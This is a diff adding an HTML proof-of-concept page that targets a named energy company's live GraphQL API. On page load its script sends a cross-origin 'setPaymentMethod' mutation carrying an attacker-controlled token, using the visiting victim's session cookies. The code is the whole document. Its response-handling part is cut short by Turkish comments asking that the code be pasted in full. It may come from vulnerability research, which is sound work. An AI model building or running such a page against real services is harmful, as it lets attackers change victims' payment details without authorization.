@@ -1,0 +1,37 @@
+<html>
+<head>
+    <title>Origin Energy HIGH IMPACT CORS MUTATION PoC</title>
+</head>
+<body>
+    <h1>Origin Energy High Impact Mutation PoC</h1>
+    <p>This code attempts a critical account mutation (setPaymentMethod) using the victim's session cookies without authorization.</p>
+    <pre id="result">Attempting mutation...</pre>
+
+    <script>
+        const HIGH_IMPACT_MUTATION = JSON.stringify({
+            query: `mutation { 
+                setPaymentMethod(input: {
+                    paymentMethodType: CREDIT_CARD,
+                    token: "ATTACKER_CONTROLLED_TOKEN_12345"
+                }) {
+                    success
+                    error {
+                        message
+                    }
+                } 
+            }`
+        });
+
+        fetch('https://api.rx.originenergy.com.au/v1/gateway/graphql', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: HIGH_IMPACT_MUTATION,
+            credentials: 'include'
+        })
+        // [Diğer then/catch kodları...]
+        // (Kodu tam yapıştırdığından emin ol)
+    </script>
+</body>
+</html>
